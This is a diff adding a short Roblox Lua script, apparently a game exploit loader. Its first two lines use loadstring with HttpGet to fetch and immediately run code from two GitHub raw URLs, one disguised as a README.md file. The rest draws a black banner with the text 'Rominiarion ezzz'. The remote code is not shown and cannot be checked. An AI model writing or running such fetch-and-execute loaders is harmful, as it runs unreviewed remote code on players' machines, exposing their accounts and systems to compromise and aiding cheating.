@@ -1,0 +1,19 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Aa1439765/Aa1439765/main/README.md",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Aa1439765/Rominia/main/Romini",true))()
+local gui = Instance.new("ScreenGui")
+gui.Parent = game.Players.LocalPlayer.PlayerGui
+
+local background = Instance.new("Frame")
+background.Size = UDim2.new(1, 0, 0, 50)
+background.Position = UDim2.new(0, 0, 0, 0)
+background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+background.BorderSizePixel = 0
+background.Parent = gui
+
+local textLabel = Instance.new("TextLabel")
+textLabel.Text = "Rominiarion ezzz"
+textLabel.Size = UDim2.new(1, 0, 0, 50) 
+textLabel.Position = UDim2.new(0, 0, 0, 0) 
+textLabel.TextColor3 = Color3.fromRGB(255, 255, 255) 
+textLabel.BackgroundTransparency = 1 
+textLabel.Parent = background
